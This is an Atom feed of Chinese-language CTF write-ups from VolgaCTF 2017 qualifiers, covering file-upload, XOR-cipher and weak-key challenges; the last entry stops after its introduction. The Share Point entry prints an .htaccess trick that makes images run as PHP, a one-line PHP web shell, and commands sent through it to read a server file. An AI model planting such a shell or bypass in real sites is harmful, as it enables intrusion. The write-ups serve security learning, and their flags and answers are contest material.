<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WhiteCat&#39;s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://andyw330.github.io/"/>
  <updated>2017-03-31T14:47:52.000Z</updated>
  <id>https://andyw330.github.io/</id>
  
  <author>
    <name>WhiteCat (andyw330)</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - Share Point 200</title>
    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Share-Point-200/"/>
    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Share-Point-200/</id>
    <published>2017-03-31T13:08:00.000Z</published>
    <updated>2017-03-31T14:47:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Web<br>Point: 200<br>Description:<br>Look! I wrote a good service for sharing your files with your friends, enjoy)<br>share-point.quals.2017.volgactf.ru</p>
<p><strong>Hints</strong></p>
<ol>
<li>flag’s location is <strong>opt</strong>imal</li>
</ol>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>這個網站可以讓人上傳檔案到自己帳號，還可以把檔案分享給另一個帳號。我們可以決定要不要收被分享的檔案，收了就會把該檔案加進自己帳號的檔案夾內。上傳檔案的部分會把<code>.php</code>, <code>.html</code>副檔名的檔案擋掉。<br>檔案資料夾路徑：<code>http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/&lt;檔案名稱&gt;</code></p>
<p>這題卡了很久，一直在找share功能是不是有能exploit的方法，試到最後只知道能把server上的檔案 (Ex: <code>../../index.php</code>) share給其他帳號。可是php檔案會被直接執行，所以也拿不到source code，也試了下拿<code>.htaccess</code>，可是讀取會得到status 403，然後就沒有然後了… QAQ</p>
<p>賽後才找到了方法，正解是我們可以上傳<code>.htaccess</code>檔案，稍微參考了一下DigitalOcean的 <a href="https://www.digitalocean.com/community/tutorials/how-to-use-the-htaccess-file" target="_blank" rel="external">How To Use the .htaccess File</a>，還有這篇 <a href="https://www.php5.idv.tw/html.php?mod=article&amp;do=show&amp;shid=39" target="_blank" rel="external">[設定] PHP安裝之後APACHE之設定</a>，顯示我們可以用<code>AddType</code>來讓不同副檔名的檔案當作php來執行。</p>
<p>在<code>.htaccess</code>裡寫下這行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AddType application/x-httpd-php .jpg</div></pre></td></tr></table></figure></p>
<p>上傳到網站上，路徑會是 <code>http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/.htaccess</code>，這就表示在我們帳號下資料夾內的<code>jpg</code>檔案能當<code>php</code>執行了！！！</p>
<p>再來建個<code>shell.jpg</code>，裡面放php shell code：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php echo system($_GET[&apos;cmd&apos;]); ?&gt;</div></pre></td></tr></table></figure></p>
<p>上傳！大功告成！<br>可以先用 locate 找 flag 的位置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/shell.jpg?cmd=locate flag</div></pre></td></tr></table></figure></p>
<p>找到flag的位置在 <code>/opt/flag.txt</code>，最後就是cat出來啦<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://share-point.quals.2017.volgactf.ru/files/&lt;帳號名稱&gt;/shell.jpg?cmd=cat /opt/flag.txt</div></pre></td></tr></table></figure></p>
<p>Flag: <code>VolgaCTF{AnoTHer_apPro0Ach_to_file_Upl0Ad_with_PhP}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Web&lt;br&gt;Point: 200&lt;br&gt;Description:&lt;br&gt;Look! I wrote a good service for sharing your files with your friends, enjoy)&lt;br&gt;share-point.quals.2017.volgactf.ru&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hints&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;flag’s location is &lt;strong&gt;opt&lt;/strong&gt;imal&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
      <category term="Web" scheme="https://andyw330.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - PyCrypto 150</title>
    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-PyCrypto-150/"/>
    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-PyCrypto-150/</id>
    <published>2017-03-31T10:12:00.000Z</published>
    <updated>2017-03-31T11:00:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Crypto + Reverse<br>Point: 150<br>Description:<br>This crypto algorithm uses a huge key and it’s implementation is not so trivial to reverse engineer. Isn’t it wonderful?<br><a href="https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/encrypt.py" target="_blank" rel="external">encrypt.py</a><br><a href="https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/flag.enc" target="_blank" rel="external">flag.enc</a><br><a href="https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/pycryptography.so" target="_blank" rel="external">pycryptography.so</a></p>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>先看看encrypt.py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python3</span></div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> pycryptography <span class="keyword">import</span> encrypt</div><div class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'wb+'</span>) <span class="keyword">as</span> f:</div><div class="line">        <span class="comment"># 160 bits security!</span></div><div class="line">        enc = encrypt(flag.encode(), os.urandom(<span class="number">20</span>))</div><div class="line">        f.write(enc)</div></pre></td></tr></table></figure></p>
<p>看到<code>160 bits security</code>得知key是20bytes。<br>再來用IDA pro看了一下<code>pycryptography.so</code>，嗯…放棄Orz<br>直接嘗試使用pycryptography的encrypt看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; from pycryptography import encrypt</div><div class="line">&gt;&gt;&gt; text = &apos;a&apos; * 40</div><div class="line">&gt;&gt;&gt; key = &apos;a&apos; * 20</div><div class="line">&gt;&gt;&gt; encrypt(text.encode(), key.encode())</div><div class="line">b&apos;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&apos;</div><div class="line">&gt;&gt;&gt; key = &apos;b&apos; * 20</div><div class="line">&gt;&gt;&gt; encrypt(text.encode(), key.encode())</div><div class="line">b&apos;\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03&apos;</div><div class="line">&gt;&gt;&gt; key = &apos;c&apos; * 20</div><div class="line">&gt;&gt;&gt; encrypt(text.encode(), key.encode())</div><div class="line">b&apos;\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02&apos;</div></pre></td></tr></table></figure></p>
<p>依結果來看，<code>encrypt()</code>就只是在做<code>xor</code>而已。<br>直接把<code>flag.enc</code>丟<code>xortool</code>看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ xortool flag.enc -l 20 -c 20</div><div class="line">1 possible key(s) of length 20:</div><div class="line">\xd1\xffc\xf7\xc8u\xd8\xc4\x1a\x84\xca$[f\x0c\x1f\xc6\xe2\xcc\xea</div><div class="line">Found 1 plaintexts with 95.0%+ printable characters</div><div class="line">See files filename-key.csv, filename-char_used-perc_printable.csv</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ cat xortool_out/0.out</div><div class="line">ol3$CTF&#123;@m _is_PadMa:&lt;_Tim s_@d_Mi$$mek8</div><div class="line">Gil&apos;er1 Vernamewa&apos;ean A&amp;TeBell La&apos;s 1+gine r 2ho, in t91ci inv nt d an ad!it=3e po)ya)phabeti&amp; s 7eam &amp;ip-er and )at17 co-,nv nted aneau *mate! o+e-time 5adt&amp;iphe7. ernam p7op;6ed aete)eprinte7 c=5her ,n 2hich a 5re&quot;,ousl&lt; p7epared .eyxekepteonepaper t$pexeis c*mb,ned cha7ac  r byech$racter 2it&lt;ethe 5la,ntext m ss5&quot;e toepr*duce th  c=5hert xtk This a7e  -e fu+da(entals *f &lt;*w on -t,me pad 2or?6.</div><div class="line">On -t,me pad ,s 5eway *f  ncrypti+g 9 ssag s 2hich isedo:  by ORhing eac- p8$inte=t &apos;yte of (es&apos;$ge y*u 2ant to  nc&amp;&lt;pt w,thea key b&lt;tet#rom $ k y strea( w&lt;,ch i6 l*ng as t-e 9 ssag  i1self.  f  -e ke&lt; i6 truly 7an0*m, i6 a1 least $s 8*ng a6 t-e plain1ex i is +ev r reuse! i:ewhol  o7 in par1, 5+d iseke5t compl te8&lt; sec7eti then t-e &amp; sult,ngeciphert xtt2ill &apos;e ,mpossib)e  * dec7yp1 or bre$k.this (ak s the o+e- ,me p$d ,nformat,ony1heor ti&amp;ally se&amp;ur1ewhic- m ans tha1 w1ecan )ea7n no in#or9$tioneab*ut the *ri3,nal (es6age (ap$rtt#rom ,t&apos;6 lengthl g=3en t-e  ncrypte! m16sagek E3erythin&quot; s1 ms p rf ct righ1? 0t wh&lt; d* we nee! a8) thi6 m*dern ci5he&amp;6 the+? hy do w  n1 d AE w-en ther  i&apos;ea &quot;p rf ct&quot; cip-erxefres- f7om 1917z W&lt; re&apos;seth  catch?OOn1htimeepa! proble(s:tn th or&lt;, this &amp;ip&lt; r isere$lly sec0rexebut ,n 5racticei t&lt; re a7e #ew majo7 d&amp;$wbac.s.eFirst, 1het.ey n ed6 to be 1ru8&lt; ran!omk You mi&quot;htt1hink &quot;o what,eth17e isea 7and() Cefu:&amp;tioneth$t giveseust7ando( n0mbers, 2e 7$n us  t-at to g ne&amp;$te o0r .ey stre$m!vk In #ac1, the r$nd|l C f0nc1ion is $ p&apos; udor$nd*m gener$to&amp;ewhic- o+ly give6 s1 ming)y 7andom n0mb17s, i1 w,ll loopeaf  r so(e +umber o# o!1putsean! its ou1pu ecan &apos;e 5redicte! w&lt;,ch m$ke6 the fu+ct=*n un7el,able fo7 s1&amp;urit&lt; p0rposes.eTh17e ar  m*re impl me:1atio+s *f rando( f!+ctio+s mpseudor$nd;( gen ra1ors) th$t 57e us d ,n secur,tyt&apos;ut Iewi)l not g* i:1o th$t +ow, onl&lt; t&lt;,ng t* r member ,s  -at t7ueerandomn sst,s ve7y -ard to $ch= ve. </div><div class="line">neesite th$t &apos;1ateseth$t can g ne&amp;$te t7ueerandom +um6 rs i6 RNDOM.OR, =1s ra+do(ness co(est#rom $tm*sphericeno=6e. A+ot-er prob)emt,s th$t 1he key +ee06 to &apos;e $s long $s  -e me6sa&quot;e itsel#,  -is m$ke6 it har! t;euse #orevery lo+g 9 ssag s &apos;ecause ,t  $kes )on&quot; to gen ra   theeke&lt;s. I wi)l &apos;-ow y*u $n examp)e ;# wha1 c$n go wr*ngt2hen &lt;oueget laz&lt; a:! useeth  same k y  * enc7yp1 many m ss5&quot;es.</div><div class="line">ak n from:eht 5s://2hi1ehatjou7ne-kword5re6s.com/2u15&#123;u8/12jma+y-time-5ady$ttac./</div></pre></td></tr></table></figure>
<p>可以看到解出來的文字有些是正確的，有些則像是亂碼或不可視字元，顯然解密用的key: <code>d1 ff 63 f7 c8 75 d8 c4 1a 84 ca 24 5b 66 c 1f c6 e2 cc ea</code> 是有些問題的。不過只要用一些已知的明文字詞來做修正就行了，譬如開頭為<code>VolgaCTF{</code>，還有後面的網址應該有<code>https</code>跟<code>wordpress</code>。</p>
<p>我用<code>xortool-xor</code>把<code>flag.enc</code>檔案跟key做xor運算來解密，經過幾次xor測試後，最後得到修正後的key為 <code>94 ff 63 a3 8d 75 d8 c4 1a c1 ca 24 1e 66 0c 1f c6 e2 cc ea</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xortool-xor -f flag.enc -h 94ff63a38d75d8c41ac1ca241e660c1fc6e2ccea</div></pre></td></tr></table></figure>
<p>解出來的plaintext：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">VolgaCTF&#123;N@me_is_Pad_Many_Times_P@d_Mi$$_me?&#125;</div><div class="line">Gilbert Vernam was an AT&amp;T Bell Labs engineer who, in 1917, invented an additive polyalphabetic stream cipher and later co-invented an automated one-time pad cipher. Vernam proposed a teleprinter cipher in which a previously prepared key, kept on paper tape, is combined character by character with the plaintext message to produce the ciphertext. This are the fundamentals of how one-time pad works.</div><div class="line">One-time pad is a way of encrypting messages which is done by XOR-ing each plaintext byte of message you want to encrypt with a key byte from a key stream which is long as the message itself.  If the key is truly random, is at least as long as the plaintext, is never reused in whole or in part, and is kept completely secret, then the resulting ciphertext will be impossible to decrypt or break. This makes the one-time pad information-theoretically secure which means that we can learn no information about the original message (apart from it&apos;s length) given the encrypted message. Everything seems perfect right? But why do we need all this modern ciphers then? Why do we need AES when there is a &quot;perfect&quot; cipher, fresh from 1917? Where&apos;s the catch?</div><div class="line">One-time pad problems: In theory, this cipher is really secure, but in practice, there are few major drawbacks. First, the key needs to be truly random. You might think: &quot;So what, there is a rand() C function that gives us random numbers, we can use that to generate our key stream!&quot;. In fact, the rand() C function is a pseudorandom generator which only gives seemingly random numbers, it will loop after some number of outputs and its output can be predicted which makes the function unreliable for security purposes. There are more implementations of random functions (pseudorandom generators) that are used in security but I will not go into that now, only thing to remember is that true randomness is very hard to achieve. One site that states that can generate true random numbers is RANDOM.ORG, its randomness comes from atmospheric noise. Another problem is that the key needs to be as long as the message itself, this makes it hard to use for very long messages because it takes long to generate the keys. I will show you an example of what can go wrong when you get lazy and use the same key to encrypt many messages.</div><div class="line">Taken from: https://whitehatjourney.wordpress.com/2015/08/12/many-time-pad-attack/</div></pre></td></tr></table></figure></p>
<p>Flag: <code>VolgaCTF{N@me_is_Pad_Many_Times_P@d_Mi$$_me?}</code></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Crypto + Reverse&lt;br&gt;Point: 150&lt;br&gt;Description:&lt;br&gt;This crypto algorithm uses a huge key and it’s implementation is not so trivial to reverse engineer. Isn’t it wonderful?&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/encrypt.py&quot;&gt;encrypt.py&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/flag.enc&quot;&gt;flag.enc&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/32hpycgnzwzu2ni4mqbjqe9dipwajd2d/pycryptography.so&quot;&gt;pycryptography.so&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
      <category term="Crypto" scheme="https://andyw330.github.io/tags/Crypto/"/>
    
      <category term="Reverse" scheme="https://andyw330.github.io/tags/Reverse/"/>
    
      <category term="Xor" scheme="https://andyw330.github.io/tags/Xor/"/>
    
  </entry>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - KeyPass 100</title>
    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-KeyPass-100/"/>
    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-KeyPass-100/</id>
    <published>2017-03-31T05:10:00.000Z</published>
    <updated>2017-03-31T07:49:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Crypto + Reverse<br>Point: 100<br>Description:<br>For reasons unknown an amature cryptographer wrote an application to generate “strong encryption keys”. One of these keys was used to encrypt a tar archive with the flag. They used openssl command line util with -aes-128-cbc. Could you please get the flag? It shouldn’t take much time…<br><a href="https://quals.2017.volgactf.ru/files/v5nxjyisi75bjdnc9nrbiocmxjvosk2v/flag.zip.enc" target="_blank" rel="external">flag.zip.enc</a><br><a href="https://quals.2017.volgactf.ru/files/v5nxjyisi75bjdnc9nrbiocmxjvosk2v/keypass" target="_blank" rel="external">keypass</a></p>
<p><strong>Hints</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ openssl</div><div class="line">OpenSSL&gt; version</div><div class="line">OpenSSL 1.1.0e  16 Feb 2017</div></pre></td></tr></table></figure></p>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>先是把keypass丟進IDA pro看看，看起來要解析似乎有點麻煩，之後就直接跑keypass看看了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ ./keypass</div><div class="line">Usage:</div><div class="line">	keypass &lt;pass_phrase&gt;</div><div class="line">		&lt;pass_phrase&gt;  that one secret phrase only you could have come up with</div></pre></td></tr></table></figure>
<p>看來程式是會吃一個argument當pass_phrase，之後把pass_phrase轉變成要丟進openssl的passphrase。<br>稍微測測看幾個pass_phrase：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">$ ./keypass a</div><div class="line">cq5$%IN1MLc(&gt;F&lt;Ol</div><div class="line"></div><div class="line">$ ./keypass aa</div><div class="line">BWf81zF%SdkxL*jL.</div><div class="line"></div><div class="line">$ ./keypass aaa</div><div class="line">cq5$%IN1MLc(&gt;F&lt;Ol</div><div class="line"></div><div class="line">$ ./keypass aaaa</div><div class="line">BWf81zF%SdkxL*jL.</div><div class="line"></div><div class="line">$ ./keypass abab</div><div class="line">BWf81zF%SdkxL*jL.</div><div class="line"></div><div class="line">$ ./keypass ababa</div><div class="line">cq5$%IN1MLc(&gt;F&lt;Ol</div></pre></td></tr></table></figure></p>
<p>歸納一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">keypass(&apos;a&apos;) = keypass(&apos;aaa&apos;) = keypass(&apos;ababa&apos;) = cq5$%IN1MLc(&gt;F&lt;Ol</div><div class="line">keypass(&apos;aa&apos;) = keypass(&apos;aaaa&apos;) = keypass(&apos;abab&apos;) = BWf81zF%SdkxL*jL.</div></pre></td></tr></table></figure></p>
<p>咦！看起來似乎是把字串內的所有字做了xor運算，再根據運算結果輸出一個passphrase，再來驗證一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ord(&apos;a&apos;) ^ ord(&apos;b&apos;) = 3</div><div class="line"></div><div class="line">$ ./keypass ab</div><div class="line">s+Tq4OY=dfK:9+.(,</div><div class="line"></div><div class="line">$ ./keypass $(python -c &quot;print chr(3)&quot;)</div><div class="line">s+Tq4OY=dfK:9+.(,</div><div class="line"></div><div class="line">keypass(&apos;ab&apos;) = keypass(chr(3))</div></pre></td></tr></table></figure></p>
<p>驗證成功！所以只要跑<code>keypass(chr(0)) ~ keypass(chr(255))</code>，就可以窮舉出所有的key了！<br>先建個passphrase_list出來：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"><span class="keyword">for</span> (( i = 0; i &lt; 256; i++ )); <span class="keyword">do</span></div><div class="line">	./keypass $(python -c <span class="string">"print chr(<span class="variable">$&#123;i&#125;</span>)"</span>) &gt;&gt; passphrase_list.txt</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure></p>
<p>再來寫個python script把每個passphrase都拿去解密看看：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> PIPE, Popen</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'passphrase_list.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> f.readlines():</div><div class="line">        cmd = <span class="string">'openssl enc -aes-128-cbc -d -in flag.zip.enc -md sha256 -k \''</span> + key.strip() + <span class="string">'\''</span></div><div class="line">        p = Popen(cmd, stdout=PIPE, stdin=PIPE, stderr=PIPE, shell=<span class="keyword">True</span>)</div><div class="line">        output, err = p.communicate()</div><div class="line">        <span class="keyword">if</span> <span class="string">'bad decrypt'</span> <span class="keyword">not</span> <span class="keyword">in</span> str(err):</div><div class="line">            print(key)</div><div class="line">            <span class="keyword">with</span> open(<span class="string">'flag.zip'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> flagfile:</div><div class="line">                flagfile.write(output)</div><div class="line">            <span class="keyword">break</span></div></pre></td></tr></table></figure></p>
<p>找到正確的passphrase是<code>\M)R&lt;.DDe/:;d&gt;JZP</code>，得到<code>flag.zip</code>。下<code>unzip flag.zip</code>，得到<code>flag.txt</code>。<br>Flag: <code>VolgaCTF{L0ve_a11_trust_@_few_d0_not_reinvent_the_wh33l}</code></p>
<h1 id="大坑"><a href="#大坑" class="headerlink" title="大坑"></a>大坑</h1><p>官方後來才給了Hints，說明是用最新版<code>OpenSSL 1.1.0e</code>做加密的，但目前的套件管理工具都是存<code>OpenSSL 1.0.2b</code>版本，要裝要自己拿source來編，結果一怒之下就找了個 <a href="https://www.tutorialspoint.com/unix_terminal_online.php" target="_blank" rel="external">online unix terminal (TutorialsPoint)</a> 來用了，載source編譯在local安裝，最後跑解密成功。</p>
<p>一開始嘗試了舊版沒辦法解密，原因出在舊版用passphrase去產生key時的implementation中default是用了md5做hash，而新版的則是用sha256。</p>
<p>詳情可以看這個openssl github的commit：<br><a href="https://github.com/openssl/openssl/commit/f8547f62c212837dbf44fb7e2755e5774a59a57b" target="_blank" rel="external">https://github.com/openssl/openssl/commit/f8547f62c212837dbf44fb7e2755e5774a59a57b</a></p>
<p>後來在stackoverflow找到了這篇：<br><a href="http://stackoverflow.com/questions/39637388/encryption-decryption-doesnt-work-well-between-two-different-openssl-versions" target="_blank" rel="external">Encryption/decryption doesn’t work well between two different openssl versions</a><br>再看一下openssl -md的說明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">-md            the next argument is the md to use to create a key</div><div class="line">                 from a passphrase.  One of md2, md5, sha or sha1</div></pre></td></tr></table></figure></p>
<p>因此如果要用舊版解密要加上<code>-md sha256</code>，嘗試一下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl enc -aes-128-cbc <span class="_">-d</span> -in flag.zip.enc -out flag.zip -k <span class="string">"\M)R&lt;.DDe/:;d&gt;JZP"</span> -md sha256</div></pre></td></tr></table></figure></p>
<p>解密成功！</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;題目資訊&quot;&gt;&lt;a href=&quot;#題目資訊&quot; class=&quot;headerlink&quot; title=&quot;題目資訊&quot;&gt;&lt;/a&gt;題目資訊&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Category: Crypto + Reverse&lt;br&gt;Point: 100&lt;br&gt;Description:&lt;br&gt;For reasons unknown an amature cryptographer wrote an application to generate “strong encryption keys”. One of these keys was used to encrypt a tar archive with the flag. They used openssl command line util with -aes-128-cbc. Could you please get the flag? It shouldn’t take much time…&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/v5nxjyisi75bjdnc9nrbiocmxjvosk2v/flag.zip.enc&quot;&gt;flag.zip.enc&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://quals.2017.volgactf.ru/files/v5nxjyisi75bjdnc9nrbiocmxjvosk2v/keypass&quot;&gt;keypass&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hints&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;$ openssl&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;OpenSSL&amp;gt; version&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;OpenSSL 1.1.0e  16 Feb 2017&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="CTF Write-ups" scheme="https://andyw330.github.io/categories/CTF-Write-ups/"/>
    
    
      <category term="VolgaCTF 2017 Quals" scheme="https://andyw330.github.io/tags/VolgaCTF-2017-Quals/"/>
    
      <category term="Crypto" scheme="https://andyw330.github.io/tags/Crypto/"/>
    
      <category term="Reverse" scheme="https://andyw330.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>[VolgaCTF 2017 Quals] - Bloody Feedback 100</title>
    <link href="https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/"/>
    <id>https://andyw330.github.io/2017/03/31/VolgaCTF-2017-Quals-Bloody-Feedback-100/</id>
    <published>2017-03-30T16:32:00.000Z</published>
    <updated>2017-03-30T18:19:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="題目資訊"><a href="#題目資訊" class="headerlink" title="題目資訊"></a>題目資訊</h1><blockquote>
<p>Category: Web<br>Point: 100<br>Description: Send your feedback at <a href="http://bloody-feedback.quals.2017.volgactf.ru" target="_blank" rel="external">bloody-feedback.quals.2017.volgactf.ru</a></p>
</blockquote>
<a id="more"></a>
<h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><p>網站給了一個表單，input欄位分別是 name, email, feedback message，填寫的表單最後會被顯示在公開佈告欄。<br>使用者發送表單後後端會回傳個隨機網址，點進網址可以查看目前feedback message的狀態，看是不是已經被放到公開佈告欄了。</p>
